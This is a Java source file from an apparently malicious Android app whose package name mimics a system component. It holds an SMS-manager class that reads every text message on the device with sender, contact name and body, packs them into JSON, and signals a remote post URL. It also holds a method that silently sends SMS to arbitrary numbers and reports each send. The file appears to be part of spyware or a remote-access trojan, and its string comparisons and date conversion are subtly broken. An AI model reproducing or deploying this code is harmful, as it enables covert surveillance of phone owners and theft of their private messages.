package oom.android.system.Managers;

import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;

import oom.android.system.app.HttpPoster;
import oom.android.system.app.MyService;

public class SmsManager {


    public SmsManager(){

    }

    public static JSONObject getSMSList(){

        try {
            JSONObject SMSList = new JSONObject();
            JSONArray list = new JSONArray();


            Uri uriSMSURI = Uri.parse("content://sms");
            Cursor cur = MyService.getContext().getContentResolver().query(uriSMSURI, null, null, null, null);

            while (cur.moveToNext()) {
                JSONObject sms = new JSONObject();
                String address = cur.getString(cur.getColumnIndex("address"));
                String date = cur.getString(cur.getColumnIndexOrThrow("date"));
                String person = cur.getString(cur.getColumnIndexOrThrow("person"));
                String body = cur.getString(cur.getColumnIndexOrThrow("body"));
                String type ="";
                Integer t = cur.getInt(cur.getColumnIndexOrThrow("type"));
                switch (t){
                    case 1:
                        type="<--";
                        break;
                    case 2:
                        type="-->";
                        break;
                }
                String personN="";
                if(person != ""){

                    Cursor c = MyService.getContext().getContentResolver().query(ContactsContract.RawContacts.CONTENT_URI,
                            new String[] { ContactsContract.RawContacts._ID,ContactsContract.RawContacts.DISPLAY_NAME_PRIMARY}, null, null,  null);
                    while (c.moveToNext()){
                        if(person == c.getString(c.getColumnIndex(ContactsContract.RawContacts._ID))){
                            personN = c.getString(c.getColumnIndex(ContactsContract.RawContacts.DISPLAY_NAME_PRIMARY));

                        }
                    }
                    c.close();

                }

                Long epoch = Long.parseLong(date);
                Date fDate = new Date(epoch * 1000);
                date = fDate.toString();

                SimpleDateFormat dateFormat = new SimpleDateFormat("dd.MM.yyyy HH:mm:ss");

                sms.put(base.SMS.SMS_TYPE,type);
                sms.put(base.SMS.SMS_PHONE , address);
                try {
                    sms.put(base.SMS.SMS_DATE,dateFormat.parse(date));
                } catch (ParseException e) {
                    sms.put(base.SMS.SMS_DATE,date);
                }
                sms.put(base.SMS.SMS_PERSON,personN);
                sms.put(base.SMS.SMS_MSG , body);
                list.put(sms);

            }
            SMSList.put(base.SMS.SMS_LIST, list);
            cur.close();
            Runnable uploader = new HttpPoster(MyService.post_url,"[Sms]Список обновлён");
            new Thread(uploader).start();
            return SMSList;
        } catch (JSONException e) {
            e.printStackTrace();
        }

        return null;

    }

    public static void sendSMS(String phoneNumber, String message)
    {
        android.telephony.SmsManager smsManager = android.telephony.SmsManager.getDefault();

        smsManager.sendTextMessage(phoneNumber, null, message, null, null);
        Runnable uploader = new HttpPoster(MyService.post_url,"[Sms]Сообщение отправленно");
        new Thread(uploader).start();
    }

}
